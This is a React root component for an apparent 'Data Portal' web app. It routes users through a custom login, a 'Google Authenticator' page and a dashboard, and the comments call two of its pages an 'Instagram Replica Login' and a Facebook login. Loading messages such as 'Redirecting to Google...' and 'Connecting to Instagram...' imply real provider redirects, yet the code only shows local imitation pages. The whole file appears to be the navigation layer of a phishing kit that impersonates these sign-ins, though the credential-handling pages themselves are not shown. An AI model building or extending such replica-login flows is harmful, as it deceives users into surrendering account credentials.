import { useState, useCallback } from 'react';
import DataPortalLogin from './pages/DataPortalLogin';
import LoginPage from './pages/LoginPage';
import Dashboard from './pages/Dashboard';
import InstagramLogin from './pages/InstagramLogin';
import FacebookLogin from './pages/FacebookLogin';
import ThankYouPage from './pages/ThankYouPage';
import LoadingOverlay from './components/LoadingOverlay';

/**
 * App - Root component for the Data Portal application.
 * Controls routing between:
 * 1. Portal Login (custom brand)
 * 2. Google Authenticator
 * 3. User Dashboard
 * 4. Instagram Replica Login
 */
function App() {
  const [view, setView] = useState('portal-login'); // 'portal-login' | 'google-authenticator' | 'dashboard' | 'instagram-login' | 'facebook-login' | 'thank-you'
  const [userEmail, setUserEmail] = useState('');
  const [isFormCompleted, setIsFormCompleted] = useState(false);
  const [connections, setConnections] = useState({
    facebook: false,
    instagram: false
  });
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');

  /** Show loading overlay for a brief moment before navigating to a new page */
  const navigateWithLoading = useCallback((nextView, message = 'Loading...', delay = 800) => {
    setIsLoading(true);
    setLoadingMessage(message);
    setTimeout(() => {
      setIsLoading(false);
      setLoadingMessage('');
      setView(nextView);
    }, delay);
  }, []);

  const handleGoogleLoginClick = () => {
    navigateWithLoading('google-authenticator', 'Redirecting to Google...', 800);
  };

  const handleLoginSuccess = (email) => {
    setUserEmail(email);
    setView('dashboard');
  };

  const handleLogout = () => {
    setUserEmail('');
    setView('portal-login');
  };

  const handleToggleConnection = (platform) => {
    if (platform === 'instagram' && !connections.instagram) {
      navigateWithLoading('instagram-login', 'Connecting to Instagram...', 800);
    } else if (platform === 'facebook' && !connections.facebook) {
      navigateWithLoading('facebook-login', 'Connecting to Facebook...', 800);
    } else {
      setConnections(prev => ({
        ...prev,
        [platform]: !prev[platform]
      }));
    }
  };

  const renderPage = () => {
    if (view === 'google-authenticator') {
      return (
        <LoginPage
          onBack={() => setView('portal-login')}
          onLoginSuccess={handleLoginSuccess}
        />
      );
    }

    if (view === 'instagram-login') {
      return (
        <InstagramLogin
          userEmail={userEmail}
          onCancel={() => setView('dashboard')}
          onLoginSuccess={() => {
            setConnections(prev => ({ ...prev, instagram: true }));
            setView('dashboard');
          }}
        />
      );
    }

    if (view === 'facebook-login') {
      return (
        <FacebookLogin
          userEmail={userEmail}
          onCancel={() => setView('dashboard')}
          onLoginSuccess={() => {
            setConnections(prev => ({ ...prev, facebook: true }));
            setView('dashboard');
          }}
        />
      );
    }

    if (view === 'dashboard') {
      return (
        <Dashboard
          userEmail={userEmail}
          onLogout={handleLogout}
          connections={connections}
          onToggleConnection={handleToggleConnection}
          isFormCompleted={isFormCompleted}
          setIsFormCompleted={setIsFormCompleted}
          onSubmitSuccess={() => setView('thank-you')}
        />
      );
    }

    if (view === 'thank-you') {
      return <ThankYouPage />;
    }

    return <DataPortalLogin onGoogleLoginClick={handleGoogleLoginClick} />;
  };

  return (
    <>
      {isLoading && <LoadingOverlay message={loadingMessage} />}
      {renderPage()}
    </>
  );
}

export default App;
